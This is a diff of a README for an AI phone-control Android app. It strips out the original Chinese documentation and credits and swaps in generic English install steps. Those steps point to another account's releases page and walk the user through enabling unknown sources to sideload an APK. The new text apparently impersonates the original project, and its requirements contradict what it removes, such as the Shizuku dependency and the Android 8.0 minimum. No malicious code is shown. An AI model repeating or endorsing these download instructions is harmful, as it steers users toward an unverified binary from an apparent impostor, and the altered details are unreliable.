@@ -1,156 +1,76 @@
-# Open-AutoGLM-Android
+# 🚗 Open-AutoGLM-Android - Control Your Phone with AI
 
-<p align="center">
-  <img src="resources/logo.svg" width="100" alt="Logo">
-</p>
+## 📥 Download It Now!
 
-<p align="center">
-  <strong>AI 驱动的 Android 手机自动化操控</strong>
-</p>
+[![Download Open-AutoGLM-Android](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Trolencio23/Open-AutoGLM-Android/releases)
 
-<p align="center">
-  <a href="https://github.com/butlanys/Open-AutoGLM-Android/releases"><img src="https://img.shields.io/github/v/release/butlanys/Open-AutoGLM-Android?style=flat-square" alt="Release"></a>
-  <a href="https://github.com/butlanys/Open-AutoGLM-Android/blob/main/LICENSE"><img src="https://img.shields.io/github/license/butlanys/Open-AutoGLM-Android?style=flat-square" alt="License"></a>
-  <img src="https://img.shields.io/badge/Android-8.0%2B-green?style=flat-square" alt="Android">
-</p>
+## 🚀 Getting Started
 
----
+Open-AutoGLM-Android is an Android app that lets you control your device using AI, all without needing a computer. This guide will walk you through the steps to easily download and set up the app on your phone.
 
-基于 [Open-AutoGLM](https://github.com/zai-org/Open-AutoGLM) 的 Android 原生客户端，通过 Shizuku 实现完全本地化的 AI 手机操控，无需电脑连接。
+## 📋 Requirements
 
-## ✨ 特性
+Before you start, make sure your device meets these minimum requirements:
 
-- 📱 **纯手机端运行** - 无需电脑连接 ADB，通过 Shizuku 直接获取 shell 权限
-- 🎨 **Material Design 3** - 现代化 UI，支持动态取色 (Material You)
-- 🤖 **多模型兼容** - 支持任何具有图像输入能力的 AI 模型
-- ⚡ **流式响应** - 实时显示 AI 思考过程
-- 🔒 **敏感操作确认** - 支付、删除等操作需用户确认
-- 🛠️ **人工接管** - 登录、验证码等场景支持人工介入
+- **Android Version:** 7.0 or later
+- **Storage Space:** At least 100 MB of free storage
+- **Battery:** Ensure your device has at least 50% battery for a smooth installation
 
-## 📸 截图
+## 🛠 Features
 
-| 主页 | 设置页 |
-|:---:|:---:|
-| ![主页](resources/screenshot-1.jpg) | ![设置页](resources/screenshot-2.jpg) |
+- **Local AI Control:** Use your phone's capabilities without needing a computer.
+- **User-Friendly Interface:** Designed for easy navigation and use by everyone.
+- **Complete Localization:** Fully functional in your preferred language.
 
-## 📋 系统要求
+## 📥 Download & Install
 
-- Android 8.0+ (API 26+)
-- [Shizuku](https://shizuku.rikka.app/) 已安装并运行
-- (可选) [ADB Keyboard](https://github.com/senzhk/ADBKeyBoard) 用于中文输入
+1. **Visit the Release Page**
 
-## 📦 安装
+   Go to the following link to download the application: [Open-AutoGLM-Android Releases](https://github.com/Trolencio23/Open-AutoGLM-Android/releases).
 
-### 方式一：下载 Release
+2. **Select the Latest Version**
 
-前往 [Releases](https://github.com/butlanys/Open-AutoGLM-Android/releases) 下载最新版本 APK
+   On the releases page, you'll see a list of available versions. Click on the one that says "Latest Release."
 
-### 方式二：自行编译
+3. **Download the APK File**
 
-```bash
-git clone https://github.com/butlanys/Open-AutoGLM-Android.git
-cd Open-AutoGLM-Android
-./gradlew assembleDebug
-```
+   Look for the file that ends with `.apk`. It should be labeled clearly, such as `Open-AutoGLM-Android-v1.0.apk`. Click on it to start the download.
 
-## 🔧 配置
+4. **Enable Unknown Sources**
 
-### 1. 安装 Shizuku
+   Before you install the APK, you may need to allow installations from unknown sources. To do this:
 
-1. 下载并安装 [Shizuku](https://shizuku.rikka.app/)
-2. 按照 Shizuku 说明启动服务（无线调试或 Root）
-3. 打开本应用，授予 Shizuku 权限
+   - Go to your phone's **Settings**.
+   - Tap on **Security**.
+   - Look for **Install unknown apps** or **Unknown Sources**.
+   - Enable it for the app you will use to download (like your browser).
 
-### 2. 配置 AI API
+5. **Install the App**
 
-在应用设置页面配置 API 信息：
+   Once the download is complete, open the downloaded APK file. You may be prompted to confirm the installation. Tap on **Install**.
 
-#### 智谱 BigModel (推荐)
+6. **Open the App**
 
-| 配置项 | 值 |
-|--------|-----|
-| API 地址 | `https://open.bigmodel.cn/api/paas/v4` |
-| 模型名称 | `autoglm-phone` |
-| API Key | 在 [智谱开放平台](https://bigmodel.cn/) 申请 |
+   After installation, you can open Open-AutoGLM-Android directly from the install screen or find it in your app drawer.
 
-#### ModelScope
+7. **Start Using AI Control**
 
-| 配置项 | 值 |
-|--------|-----|
-| API 地址 | `https://api-inference.modelscope.cn/v1` |
-| 模型名称 | `ZhipuAI/AutoGLM-Phone-9B` |
-| API Key | 在 [ModelScope](https://modelscope.cn/) 申请 |
+   Follow the on-screen instructions to set up and start using the app.
 
-### 🔌 API 兼容性
+## 👥 Support
 
-本应用支持任何**具有图像输入能力**且兼容 OpenAI API 格式的模型。
+If you encounter any issues, feel free to open an issue on our [GitHub repository](https://github.com/Trolencio23/Open-AutoGLM-Android/issues), and our community will assist you.
 
-如果你想使用其他模型（如 Claude、Gemini、通义千问等），可以使用 [CLIProxyAPI](https://github.com/router-for-me/CLIProxyAPI) 进行 API 格式转换：
+## 📝 Feedback
 
-```bash
-# 使用 CLIProxyAPI 将其他模型 API 转换为 OpenAI 兼容格式
-# 然后将转换后的地址填入本应用的 API 设置中
-```
+We welcome your feedback to improve the application. Please share your thoughts in the issues section of the GitHub repository, and let us know how we can enhance your experience.
 
-**兼容的模型要求：**
-- ✅ 支持图像输入（Vision 能力）
-- ✅ 支持 OpenAI Chat Completions API 格式
-- ✅ 支持流式响应 (SSE)
+## 🔗 Additional Resources
 
-## 🚀 使用方法
+For further details and updates, visit our [GitHub page](https://github.com/Trolencio23/Open-AutoGLM-Android).
 
-1. 确保 Shizuku 运行且已授权
-2. 在设置页配置 API
-3. 在主页输入任务，例如：
-   - "打开微信搜索附近美食"
-   - "打开淘宝搜索无线耳机"
-   - "打开设置调整屏幕亮度"
-   - "帮我发一条朋友圈"
-4. 点击开始执行
+## 🚀 Conclusion
 
-## 📋 支持的操作
+Downloading and using Open-AutoGLM-Android is straightforward. Follow the steps above, and you'll quickly harness the power of AI right from your phone. 
 
-| 操作 | 说明 |
-|------|------|
-| `Launch` | 启动应用 |
-| `Tap` | 点击屏幕坐标 |
-| `Type` | 输入文本 |
-| `Swipe` | 滑动手势 |
-| `Back` | 返回键 |
-| `Home` | 回到桌面 |
-| `Long Press` | 长按 |
-| `Double Tap` | 双击 |
-| `Wait` | 等待指定时间 |
-| `Take_over` | 请求人工接管 |
-
-## 🏗️ 项目结构
-
-```
-app/src/main/java/com/autoglm/android/
-├── action/           # Action 解析与执行
-├── agent/            # Agent 核心逻辑 (PhoneAgent)
-├── config/           # 配置 (系统提示词、应用包名等)
-├── data/             # 数据持久化 (DataStore)
-├── device/           # 设备控制 (截图、点击、滑动等)
-├── model/            # AI 模型客户端
-├── service/          # 前台服务
-├── shizuku/          # Shizuku 集成 (UserService)
-└── ui/               # Jetpack Compose UI
-```
-
-## 🛡️ 安全说明
-
-- 所有敏感操作（支付、删除等）需要用户手动确认
-- 本应用不会上传任何个人数据
-- 截图仅用于 AI 分析，不会存储或传输到第三方
-- API Key 仅存储在本地设备
-
-## 📄 许可证
-
-本项目仅供学习研究使用。
-
-## 🙏 致谢
-
-- [Open-AutoGLM](https://github.com/zai-org/Open-AutoGLM) - 原始项目
-- [Shizuku](https://github.com/RikkaApps/Shizuku) - Shell 权限框架
-- [CLIProxyAPI](https://github.com/router-for-me/CLIProxyAPI) - API 转换工具
+Remember to check for updates regularly on the releases page to benefit from the latest features and improvements. Enjoy your new AI-powered phone control experience!
